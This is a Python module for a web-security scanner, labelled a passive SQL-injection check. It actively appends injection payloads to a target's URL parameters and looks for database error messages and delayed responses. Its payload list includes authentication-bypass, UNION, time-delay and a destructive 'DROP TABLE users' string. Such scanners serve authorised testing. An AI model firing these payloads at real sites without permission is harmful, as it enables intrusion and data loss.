#!/usr/bin/env python3

# modules/sqli_passive.py
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.core import Color, save_log, safe_request

# SQL error patterns for detection
SQL_ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL server",
        r"Unknown column '[^']+' in 'where clause'",
        r"You have an error in your SQL syntax",
        r"MySQL server version for the right syntax",
        r"\[MySQL\]",
        r"mysqli_fetch",
        r"mysql_fetch",
        r"num_rows",
        r"mysql_error",
        r"supplied argument is not a valid MySQL"
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"PostgreSQL query failed",
        r"psql: ERROR:",
        r"ERROR:  syntax error at or near",
        r"pg_query",
        r"pg_fetch",
        r"pg_numrows",
        r"pg_exec"
    ],
    "Microsoft SQL Server": [
        r"Driver.*SQL Server",
        r"SQL Server.*Driver",
        r"Warning.*sqlsrv_.*",
        r"ODBC.*SQL Server",
        r"Microsoft OLE DB Provider for ODBC Drivers",
        r"Microsoft OLE DB Provider for SQL Server",
        r"Unclosed quotation mark",
        r"SQL Server.*DBMS",
        r"mssql_query",
        r"mssql_fetch",
        r"mssql_numrows"
    ],
    "Oracle": [
        r"Oracle.*Driver",
        r"Oracle.*DBMS",
        r"ORA-[0-9]{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"oci_.*",
        r"oci8",
        r"ora_[0-9]{5}"
    ],
    "SQLite": [
        r"SQLite.*error",
        r"sqlite_.*",
        r"SQLite3::",
        r"unrecognized token",
        r"sqlite3_exec",
        r"sqlite3_prepare"
    ],
    "Generic": [
        r"SQL syntax",
        r"database error",
        r"DB Error",
        r"DB2 Error",
        r"Driver Error",
        r"Error Executing Database Query",
        r"Error with database",
        r"Invalid SQL",
        r"Syntax error",
        r"Unclosed quotation mark",
        r"Unterminated string literal",
        r"quoted string not properly terminated",
        r"division by zero",
        r"could not execute statement",
        r"supplied argument is not a valid",
        r"mysql_fetch",
        r"pg_query",
        r"mssql_query",
        r"sqlite_exec"
    ]
}

# SQL test payloads (minimal, for error detection)
TEST_PAYLOADS = [
    "'",
    "\"",
    "''",
    "\"\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "\" OR 1=1--",
    "1' AND '1'='1",
    "1' AND 1=1--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(5)--",
    "'; DROP TABLE users--",
    "admin'--",
    "' OR '1'='1'/*",
    "' OR '1'='1'#",
    "1) AND 1=1--",
    "1) AND (SELECT * FROM users)--"
]

def extract_parameters(url):
    """Extract parameters from URL"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return parsed, params

def build_test_url(parsed, params, payload):
    """Build URL with test payload"""
    new_params = {}
    for key, values in params.items():
        new_params[key] = [values[0] + payload]
    
    new_query = urlencode(new_params, doseq=True)
    new_parsed = parsed._replace(query=new_query)
    return urlunparse(new_parsed)

def detect_sql_error(response_text):
    """Detect SQL errors in response"""
    findings = []
    text_lower = response_text.lower()
    
    for db_type, patterns in SQL_ERROR_PATTERNS.items():
        for pattern in patterns:
            try:
                if re.search(pattern, text_lower, re.IGNORECASE):
                    findings.append({
                        "database": db_type,
                        "pattern": pattern
                    })
                    break  # Found one pattern for this DB
            except:
                pass
    
    return findings

def check_time_based(response_time, threshold=5):
    """Check if response took unusually long (possible time-based SQLi)"""
    if response_time > threshold:
        return True, f"Slow response: {response_time:.2f}s"
    return False, None

def analyze_url_structure(url):
    """Analyze URL for SQLi potential"""
    risks = []
    
    # Check for numeric parameters
    parsed, params = extract_parameters(url)
    for param, values in params.items():
        for value in values:
            if value.isdigit():
                risks.append({
                    "parameter": param,
                    "value": value,
                    "risk": "Numeric parameter - possible SQL injection"
                })
    
    return risks

def run(target):
    """Main passive SQLi scanner"""
    print(Color.C + "\n[+] Passive SQLi Reflection Check\n" + Color.N)
    
    if not target:
        print(Color.R + "[!] No target set" + Color.N)
        return
    
    # Try both HTTP and HTTPS
    urls = [f"https://{target}", f"http://{target}"]
    
    result = {
        "target": target,
        "url_used": None,
        "tested_urls": [],
        "vulnerabilities": [],
        "error_patterns": [],
        "parameters": {},
        "risk_analysis": [],
        "summary": {
            "total_tests": 0,
            "error_responses": 0,
            "parameters_found": 0
        }
    }
    
    response = None
    url_used = None
    
    # Try URLs
    for url in urls:
        print(Color.Y + f"[*] Testing {url}..." + Color.N)
        resp, error = safe_request(url, timeout=8)
        
        if not error and resp and resp.status_code < 500:
            response = resp
            url_used = url
            print(Color.G + f"[✓] Connected to {url}" + Color.N)
            break
        elif resp:
            print(Color.Y + f"    Response: {resp.status_code}" + Color.N)
        else:
            print(Color.Y + f"    Error: {error}" + Color.N)
    
    if not response:
        print(Color.R + "[!] Could not connect to target" + Color.N)
        return
    
    result["url_used"] = url_used
    
    # Analyze URL structure for risks
    risks = analyze_url_structure(url_used)
    if risks:
        result["risk_analysis"] = risks
        print(Color.Y + f"\n[!] URL Risk Analysis:" + Color.N)
        for risk in risks:
            print(f"  {Color.Y}• Parameter '{risk['parameter']}' - {risk['risk']}{Color.N}")
    
    # Extract parameters from URL
    parsed, params = extract_parameters(url_used)
    result["parameters"] = {k: v for k, v in params.items()}
    result["summary"]["parameters_found"] = len(params)
    
    if params:
        print(Color.Y + f"\n[*] Found {len(params)} parameters in URL" + Color.N)
        
        # Test each parameter with each payload
        for param in params.keys():
            print(Color.C + f"\n[Testing parameter: {param}]{Color.N}")
            
            for payload in TEST_PAYLOADS[:5]:  # Test first 5 payloads
                test_url = build_test_url(parsed, params, payload)
                result["tested_urls"].append(test_url)
                result["summary"]["total_tests"] += 1
                
                print(f"  {Color.Y}Payload: {payload}{Color.N}")
                
                # Make request with payload
                resp, error = safe_request(test_url, timeout=8)
                
                if not error and resp:
                    # Check for SQL errors
                    errors = detect_sql_error(resp.text)
                    
                    if errors:
                        print(f"    {Color.R}⚠ SQL Error Detected!{Color.N}")
                        for error in errors:
                            print(f"      {Color.R}• {error['database']}{Color.N}")
                        
                        result["vulnerabilities"].append({
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "errors": errors
                        })
                        result["summary"]["error_responses"] += 1
                        result["error_patterns"].extend(errors)
                    else:
                        print(f"    {Color.G}✓ No SQL errors{Color.N}")
                else:
                    print(f"    {Color.Y}✗ Request failed{Color.N}")
    
    # Check for blind/time-based indicators
    print(Color.C + f"\n[*] Testing for time-based indicators..." + Color.N)
    
    for payload in ["' AND SLEEP(3)--", "1' WAITFOR DELAY '0:0:3'--"]:
        if params:
            test_url = build_test_url(parsed, params, payload)
            import time
            start = time.time()
            resp, error = safe_request(test_url, timeout=10)
            elapsed = time.time() - start
            
            if not error and elapsed > 3:
                print(f"  {Color.R}⚠ Time-based anomaly: {elapsed:.2f}s with payload: {payload}{Color.N}")
                result["vulnerabilities"].append({
                    "url": test_url,
                    "type": "time-based",
                    "payload": payload,
                    "response_time": elapsed
                })
    
    # Summary
    print(Color.C + "\n┌─ SQLi SCAN SUMMARY ──────────────────┐" + Color.N)
    print(f"  {Color.Y}Tests Performed:{Color.N} {result['summary']['total_tests']}")
    print(f"  {Color.Y}SQL Errors Found:{Color.N} {Color.R if result['summary']['error_responses'] > 0 else Color.G}{result['summary']['error_responses']}{Color.N}")
    print(f"  {Color.Y}Parameters Tested:{Color.N} {result['summary']['parameters_found']}")
    
    if result["error_patterns"]:
        dbs = set([e['database'] for e in result["error_patterns"]])
        print(f"  {Color.Y}Databases Detected:{Color.N} {', '.join(dbs)}")
    
    print(Color.C + "└────────────────────────────────────┘" + Color.N)
    
    if result["vulnerabilities"]:
        print(Color.R + f"\n[!] SQL Injection vulnerabilities detected!" + Color.N)
        for vuln in result["vulnerabilities"][:5]:
            if "errors" in vuln:
                print(f"  {Color.R}⚠ Parameter '{vuln['parameter']}' with payload '{vuln['payload']}'{Color.N}")
                for error in vuln['errors']:
                    print(f"    {Color.R}• {error['database']}{Color.N}")
    
    # Save results
    filename = save_log(target, "sqli_passive", result)
    print(Color.Y + f"\nSaved → {filename}\n" + Color.N)